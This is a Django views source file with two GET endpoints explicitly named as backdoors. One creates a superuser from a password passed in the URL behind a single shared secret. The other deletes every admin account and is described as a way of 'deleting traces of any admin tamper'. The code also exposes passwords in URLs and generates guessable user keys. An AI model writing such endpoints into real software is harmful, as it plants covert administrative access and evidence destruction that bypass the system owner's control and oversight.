
import hmac
import random
import string

from django.db import IntegrityError, transaction
from django.http import JsonResponse
from django.views import View
from django.conf import settings

from common.models import BaseUser
from utiltiy.config import Static


class BackDoorCreateAccount(View):
    """USEFUL FOR CREATING A QUICK ADMIN ACCOUNT FOR SY TEAM"""
    def get(self, request, email, password, sy_secret_key):
        try:
            if Static().verify_sy_secret_key(sy_secret_key) is False: return JsonResponse({'message': 'UnAuthorized.'}, status  = 401)
            with transaction.atomic():
                user_key = random.randint(0,1000)
                user_key = f"sy{user_key:04d}"
                istance = BaseUser.objects.create_superuser(
                    user_key = user_key,
                    email= email,
                    is_active = True,
                    password= password,
                    )
                _dict = istance.__dict__
                _dict.pop('_state')
                _dict.pop('password')
                _dict.pop('_password')
                return JsonResponse({'message': 'admin created', "extra": _dict},safe = False, status = 200)
        except IntegrityError:
            return JsonResponse({'message': "Integrity Error"})

class BackDoorDeleteAccount(View):
    """USEFUL FOR DELETING TRACES OF ANY ADMIN TAMPER, ONLY FOR DEBUG , NO FORGET COMOT AM!"""
    def get(self, request, sy_secret_key):
        if not hmac.compare_digest(sy_secret_key, settings.SECIAL_KEY): return JsonResponse({'message': 'UnAuthorized.'}, status  = 401)
        #clear all admin
        try:
            with transaction.atomic():
                admins = BaseUser.objects.filter(role = 'ADMIN')
                count = admins.count()
                if count< 1: return JsonResponse({'message': 'No sy admin found'})
                admins.delete()
                return JsonResponse({'message': 'Success', 'extra': f'All sy admin account have been deleted total: {count}'})
        except:
            return JsonResponse({'message': 'Error', 'extra': 'Failed to delete'})
